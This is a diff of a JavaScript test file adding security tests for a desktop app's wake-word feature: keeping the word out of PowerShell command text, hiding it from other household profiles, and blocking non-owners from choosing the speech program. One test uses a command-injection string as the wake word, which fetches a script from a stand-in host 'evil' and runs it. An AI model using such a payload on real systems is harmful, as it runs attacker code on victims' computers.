@@ -15,7 +15,8 @@ import { join } from "node:path";
 import { discardTemp } from "./temp-dir.mjs";
 import { createBranch } from "../dist/index.js";
 import { setLockdown } from "../dist/lockdown.js";
-import { saveVoiceSettings } from "../dist/voice.js";
+import { saveVoiceSettings, voiceSettings } from "../dist/voice.js";
+import { startServer } from "../dist/server.js";
 import {
   askSpotter, isTheWord, listenForWake, saveWakeWordSettings, wakeRefusal, wakeSpotter, wakeWordSettings,
   wakeWordState, wakeWordView,
@@ -128,7 +129,10 @@ test("W6 what each computer would really do, and the ones that say so and stay o
   assert.equal(windows.available, true);
   assert.match(windows.how, /Windows' own speech recognition/);
   assert.equal(windows.command.file, "powershell.exe");
-  assert.ok(windows.command.args.includes("branch"), "the word is passed as an argument, never pasted into the script");
+  // Integration review: PowerShell's -Command glues any words after it onto the command string, so
+  // the word goes in the environment, where it is only ever a value.
+  assert.equal(windows.command.args.includes("branch"), false, "the word was put on the command line after -Command");
+  assert.equal(windows.command.env.BRANCH_WAKE_WORD, "branch");
   assert.match(windows.command.args.join(" "), /System\.Speech/);
 
   for (const platform of ["darwin", "linux"]) {
@@ -190,4 +194,66 @@ test("W10 what goes over the wire never carries the program that would be run", 
   assert.deepEqual(Object.keys(view.spotter).sort(), ["available", "how"]);
   assert.equal(JSON.stringify(view).includes("powershell"), false, "the spotter's program travelled");
   assert.equal(wakeWordState(store, owner, "win32").spotter.command.file, "powershell.exe", "the app itself still knows it");
+});
+
+/* ---------- integration review (adversarial) ---------- */
+
+test("W11 the owner's word never travels to anybody else on this computer", async (t) => {
+  const { app, root } = await fixture(t);
+  saveWakeWordSettings(app.store, "local", { mode: "on", word: "open sesame" });
+  saveVoiceSettings(app.store, "local", { localSpeechExecutable: "/opt/whisper/main", localSpeechModel: "/opt/m.bin" });
+  const server = await startServer(app, { dataDir: join(root, "data"), port: 0 });
+  t.after(async () => { await server.close(); });
+  const get = () => fetch(server.url + "/api/voice/wake", { headers: { authorization: `Bearer ${server.token}` } })
+    .then((response) => response.json());
+  assert.equal((await get()).settings.word, "open sesame", "the owner cannot see their own word");
+
+  const profile = app.store.profiles.create({ name: "Sam", pin: "2468" });
+  app.store.profiles.switch({ profileId: profile.id, pin: "2468" });
+  const seen = JSON.stringify(await get());
+  assert.equal(seen.includes("open sesame"), false, `the owner's word travelled to a household profile: ${seen}`);
+});
+
+test("W12 the spotter's program is the owner's to choose, and nobody else's", async (t) => {
+  const { app, root } = await fixture(t);
+  const server = await startServer(app, { dataDir: join(root, "data"), port: 0 });
+  t.after(async () => { await server.close(); });
+  const profile = app.store.profiles.create({ name: "Sam", pin: "2468" });
+  app.store.profiles.switch({ profileId: profile.id, pin: "2468" });
+  // The wake word runs whatever this names. Somebody else on this computer naming it would be
+  // choosing a program for Branch to run, which is never theirs to do.
+  const answer = await fetch(server.url + "/api/voice/settings", {
+    method: "POST", headers: { authorization: `Bearer ${server.token}`, "content-type": "application/json" },
+    body: JSON.stringify({ localSpeechExecutable: "/tmp/anything", localSpeechModel: "/tmp/m.bin" }),
+  });
+  // Refused the way every other thing of the owner's is refused over HTTP in this app (a plain
+  // "belongs to the owner", which src/server.ts answers 400; the wording is what a person reads).
+  assert.equal(answer.ok, false, "somebody else on this computer chose the program Branch runs");
+  assert.match((await answer.json()).error, /belongs to the owner/);
+  assert.equal(voiceSettings(app.store, "local").localSpeechExecutable, "",
+    "the owner's own speech program was overwritten by somebody else");
+});
+
+test("W13 the word is handed to the spotter as its own thing, never pasted into a script", async (t) => {
+  const { store, owner } = await fixture(t);
+  // A word is just text the owner typed; if it landed in the script it would be read as code.
+  saveWakeWordSettings(store, owner, { mode: "on", word: `x"; iwr http://evil/a.ps1 | iex; "` });
+  const spotter = wakeSpotter(voiceSettings(store, owner), wakeWordSettings(store, owner), "win32");
+  const script = spotter.command.args.join(" ");
+  assert.equal(script.includes("iwr"), false, `the word was pasted into the script text: ${script}`);
+  assert.equal(spotter.command.env.BRANCH_WAKE_WORD, `x"; iwr http://evil/a.ps1 | iex; "`);
+  // And the spotter is run with a clean environment, so nothing of the owner's leaks into it.
+  assert.deepEqual(Object.keys(spotter.command.env).sort(), ["BRANCH_WAKE_SURENESS", "BRANCH_WAKE_WORD"]);
+});
+
+test("W14 the card says plainly that nothing yet feeds the listener", async (t) => {
+  const { store, owner } = await fixture(t);
+  saveVoiceSettings(store, owner, { localSpeechExecutable: "/opt/whisper/main", localSpeechModel: "/opt/m.bin" });
+  saveWakeWordSettings(store, owner, { mode: "on", word: "branch" });
+  // Everything is set up and the switch is on, and still nothing listens: Branch never opens the
+  // microphone by itself. The card must say so rather than reading as though it were listening.
+  const view = wakeWordView(store, owner, "darwin");
+  assert.equal(view.listening, false, "the card claims to be listening when nothing feeds the listener");
+  assert.match(view.capture, /microphone/i);
+  assert.match(view.capture, /not|nothing/i);
 });
